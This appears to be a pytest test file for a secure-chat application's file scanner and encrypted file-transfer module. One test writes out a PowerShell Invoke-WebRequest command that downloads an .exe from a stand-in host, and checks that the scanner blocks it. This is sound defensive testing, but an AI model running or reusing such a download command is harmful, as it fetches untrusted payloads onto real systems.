import pytest

from common.secure_chat import file_scanner, file_transfer, key_store, messages


def test_safe_text_file_passes_scan(tmp_path):
    path = tmp_path / "note.txt"
    path.write_text("ordinary text document", encoding="utf-8")

    report = file_scanner.scan_file(path)

    assert report.status == "passed"
    assert report.sha256


def test_eicar_file_is_blocked(tmp_path):
    path = tmp_path / "eicar.txt"
    path.write_text(file_scanner.EICAR_TEST_STRING, encoding="utf-8")

    report = file_scanner.scan_file(path)

    assert report.status == "blocked"
    assert "eicar_signature" in report.rules


def test_executable_extension_is_blocked(tmp_path):
    path = tmp_path / "runme.bat"
    path.write_text("echo bad", encoding="utf-8")

    report = file_scanner.scan_file(path)

    assert report.status == "blocked"
    assert "dangerous_extension" in report.rules


def test_dangerous_script_content_is_blocked(tmp_path):
    path = tmp_path / "payload.txt"
    path.write_text("powershell Invoke-WebRequest http://example.test/payload.exe", encoding="utf-8")

    report = file_scanner.scan_file(path)

    assert report.status == "blocked"
    assert "dangerous_text_pattern" in report.rules


def test_encrypted_file_package_roundtrip_and_tamper_rejection(tmp_path):
    alice = key_store.create_key_store("alice", "pw1", tmp_path / "alice.json")
    bob = key_store.create_key_store("bob", "pw2", tmp_path / "bob.json")
    session = messages.create_session("alice", "bob", alice.signing_private_key, bob.encryption_public_key)
    receiver_session = messages.accept_session(session, alice.signing_public_key, bob.encryption_private_key)
    path = tmp_path / "report.txt"
    path.write_text("safe report content", encoding="utf-8")

    package = file_transfer.encrypt_file_for_session(path, session, alice.signing_private_key)

    output_path = tmp_path / "downloaded.txt"
    file_transfer.decrypt_file_from_package(package, receiver_session, alice.signing_public_key, output_path)
    assert output_path.read_text(encoding="utf-8") == "safe report content"

    package["ciphertext_b64"] = package["ciphertext_b64"][:-2] + "AA"
    with pytest.raises(file_transfer.FileTransferError):
        file_transfer.decrypt_file_from_package(package, receiver_session, alice.signing_public_key, tmp_path / "bad.txt")
